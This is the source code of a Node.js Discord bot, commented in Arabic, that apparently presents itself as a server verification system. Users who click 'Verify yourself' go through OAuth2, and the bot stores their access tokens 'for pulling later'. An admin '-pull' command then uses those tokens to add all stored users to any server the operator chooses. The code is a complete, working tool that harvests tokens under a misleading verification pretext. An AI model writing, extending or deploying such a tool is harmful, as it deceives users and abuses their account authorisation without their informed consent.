const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits
} = require('discord.js');
const express = require('express');
const axios = require('axios'); // حزمة لإتمام طلبات الـ OAuth2 من ديسكورد وسحب الأعضاء

const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات مؤقتة لتخزين الـ Access Tokens الخاصة بالأعضاء الموثقين
const verifiedUsers = new Map(); 

app.use(express.json());

app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));

// الرابط البرمجي (Callback) لمعالجة التحقق
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        // 1. تبديل الـ Code بـ Access Token من ديسكورد
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        // 2. جلب معلومات حساب العضو لمعرفة أيدي حسابه
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        // 3. تخزين العضو والـ Access Token للسحب لاحقاً
        verifiedUsers.set(userId, accessToken);

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error('Error during OAuth2 callback:', error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// الاختصارات الحصرية لنظام التحقق والسحب
const VERIFY_SETUP_PREFIX = '-vr';    // إرسال رسالة التحقق مع الزر
const SET_VERIFY_URL_PREFIX = '-vt';  // تعيين وتحديث رابط الـ OAuth2 للتحقق
const COUNT_VERIFY_PREFIX = '-vf';    // فحص إجمالي عدد الأعضاء الموثقين
const PULL_MEMBERS_PREFIX = '-pull';  // أمر سحب الأعضاء الفوري للسيرفر المحدد

let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

client.once('ready', async () => {
    console.log(`Verify Bot is Online as ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();

    // 1. إرسال البوكس وزر Verify Yourself
    if (content === VERIFY_SETUP_PREFIX) {
        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإداريين فقط.');
        }

        const embed = new EmbedBuilder()
            .setTitle('🛡️ Server Verification / التحقق الذاتي')
            .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر.')
            .setColor('#2b2d31');

        const verifyButton = new ButtonBuilder()
            .setLabel('Verify yourself')
            .setURL(verifyUrl)
            .setStyle(ButtonStyle.Link)
            .setEmoji('✅');

        const row = new ActionRowBuilder().addComponents(verifyButton);

        await message.channel.send({ embeds: [embed], components: [row] });
        await message.delete().catch(() => {});
        return;
    }

    // 2. تحديث وتغيير رابط التحقق الخاص بك
    if (content.startsWith(SET_VERIFY_URL_PREFIX)) {
        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
        const newUrl = content.replace(SET_VERIFY_URL_PREFIX, '').trim();
        if (!newUrl || !newUrl.startsWith('http')) {
            return message.reply('❌ يرجى وضع رابط الـ OAuth2 الصحيح للتحقق (مثال: `-vt https://discord.com/...`):');
        }
        verifyUrl = newUrl;
        await message.reply('✅ **تم بنجاح حفظ وتحديث رابط التحقق الذاتي الخاص بك!**');
        await message.delete().catch(() => {});
        return;
    }

    // 3. فحص عدد الموثقين بداخل قاعدة البيانات
    if (content === COUNT_VERIFY_PREFIX) {
        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
        await message.reply(`📊 **إحصائية التحقق المطور:**\nالعدد الكلي للأعضاء الموثقين والمخزنين والجاهزين للسحب هو: \`${verifiedUsers.size}\` عضو.`);
        return;
    }

    // 4. السحب الفوري والسريع لجميع الموثقين إلى السيرفر المحدد (-pull [Server ID])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0] || message.guild.id; 

        if (verifiedUsers.size === 0) {
            return message.reply('❌ لا يوجد أي أعضاء موثقين ومسجلين بداخل قاعدة بيانات البوت حالياً لسحبهم.');
        }

        const statusMsg = await message.channel.send(`⏳ **جاري بدء عملية سحب وإدخال \`${verifiedUsers.size}\` عضو إلى السيرفر المحدد...**`);

        let successCount = 0;
        let failCount = 0;
        let alreadyInCount = 0;

        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
            return statusMsg.edit('❌ البوت ليس موجوداً بداخل السيرفر المستهدف لتطبيق السحب يرجى دعوته أولاً للسيرفر الآخر.');
        }

        const userArray = Array.from(verifiedUsers.entries());

        let index = 0;
        const interval = setInterval(async () => {
            if (index >= userArray.length) {
                clearInterval(interval);
                await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 الأعضاء الذين تم إدخالهم: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر بالفعل: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهت صلاحية الـ Token): \`${failCount}\` عضو.`);
                return;
            }

            const [userId, accessToken] = userArray[index];

            const isMember = targetGuild.members.cache.has(userId);
            if (isMember) {
                alreadyInCount++;
            } else {
                try {
                    await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userId}`, {
                        access_token: accessToken
                    }, {
                        headers: {
                            Authorization: `Bot ${TOKEN}`,
                            'Content-Type': 'application/json'
                        }
                    });
                    successCount++;
                } catch (err) {
                    failCount++;
                }
            }

            await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${userArray.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
            index++;
        }, 1200); 

        return;
    }
});

client.login(TOKEN);